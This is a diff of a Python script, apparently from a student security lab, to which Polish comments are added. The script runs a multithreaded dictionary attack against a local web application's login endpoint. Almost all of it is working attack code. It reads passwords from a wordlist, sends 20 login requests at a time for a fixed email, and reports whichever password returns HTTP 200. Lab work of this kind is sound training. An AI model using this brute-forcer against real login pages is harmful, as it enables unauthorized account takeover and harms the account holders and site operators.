@@ -1,63 +1,92 @@
 import sys
 import requests
-from concurrent.futures import ThreadPoolExecutor
+
+#importujemy bibliotki do wykonywania zadań w wielu wątkach jednocześnie oraz do wyświetlania postępu
+from concurrent.futures import ThreadPoolExecutor, as_completed
 import tqdm
+
+#importujemy funckje która pozwala nam na dzielenie listy na mniejsze "paczki"
 from itertools import islice
 
 SLICE_SIZE = 1000
 
+#funnckja która wykonuje atak słownikowy na podany url
 def brute_force_login(url, username, password):
+    #można dodać nagłowek jesli strona tego wymaga
     Headers = {
 
     }
+    #tworzymy strukturę danych która będzie wysyłana w zapytaniu POST
     Post_structure = {
         "email": username,
         "password": password
     }
 
+    #jeśli nagłowek jest pusty, wysyłamy zapytanie bez nagłówka
     if Headers == {}:
+        #wysyłamy zapytanie POST z danymi logowania, jesli status code to 200, oznacza ze mamy hasło
         response = requests.post(url, json=Post_structure)
         if response.status_code == 200:
             return password
     else:
+        #wysyłamy zapytanie POST z danymi logowania, jesli status code to 200, oznacza ze mamy hasło
         response = requests.post(url, json=Post_structure, headers=Headers)
         if response.status_code == 200:
             return password
     return None
 
 if __name__ == "__main__":
-    target_url = "http://localhost:3000/rest/user/login"  # Replace with the target URL
-    wordlist_file = "lab 12/directory-list-2.3-medium.txt" #"/usr/share/wordlists/rockyou.txt"  # Replace with the path to your wordlist
-    username = "temp@mail.com"  # Replace with the target username
+    
+    target_url = "http://localhost:3000/rest/user/login" #adres URL strony
+    wordlist_file = "lab 12/directory-list-2.3-medium.txt" #ścieżka do słownika haseł
+    username = "temp@mail.com" #nazwa użytkownika/email
+    
     try:
         with open(wordlist_file, 'r') as wordlist:
+            
+            #otwieramy pulę wątków, max_workers=20 oznacza że jednocześnie będzie sprawdzanych 20 haseł
             with ThreadPoolExecutor(max_workers=20) as executor:
-                progress = tqdm.tqdm(total=sum(1 for _ in wordlist), desc="Brute forcing login", unit="password")
+                
+                #tworzymy własny pasek postępu, total to liczba haseł w słowniku, desc to opis paska, unit to jednostka
+                progress = tqdm.tqdm(total=sum(1 for _ in wordlist), desc="Brute forcing hasła", unit="hasło")
+                
+                #resetujemy wskaźnik pliku na początek, aby móc ponownie czytać hasła
                 wordlist.seek(0)
                 while True:
-
+                    
+                    #dzielimy słownik na mniejsze paczki, aby nie ładować całego słownika do pamięci naraz
                     paczka = list(islice(wordlist, SLICE_SIZE))
+                    
+                    #jeśli paczka jest pusta, oznacza że doszliśmy do końca słownika
                     if not paczka:
                         break
                     
+                    #pula wątków
                     futures = []
                     for password in paczka:
                         password = password.strip()
+                        
+                        #dodajemy zadanie sprawdzenia hasła do puli wątków
                         future = executor.submit(brute_force_login, target_url, username, password)
                         futures.append(future)
-                        
-                    for future in futures:
+                    
+                    #sprawdzamy wyniki z puli wątków, i jesli któreś hasło jest poprawne, wyświetlamy je i przerywamy skanowanie
+                    for future in as_completed(futures):
                         result = future.result()
                         if result is not None:
-                            tqdm.tqdm.write(f"Found password: {result}")
+                            tqdm.tqdm.write(f"hasło znalezione: {result}")
                             break
-                        
-                    progress.update(len(paczka))
                     
+                    #przesuwamy pasek postępu o liczbę haseł w paczce
+                    progress.update(len(paczka))
+                
+                #wyświetlamy komunikat że skanowanie zakończone, i zamykamy pasek postępu
+                tqdm.tqdm.write("koniec skanowania")
                 progress.close()
 
     except KeyboardInterrupt:
-        print("Scan interrupted by user.")
+        print("skan przerwany przez użytkownika.")
+        #wychodzimy z programu z kodem -1
         sys.exit(-1)
     except Exception as e:
-        print(f"Error occurred: {e}")
+        print(f"Error: {e}")
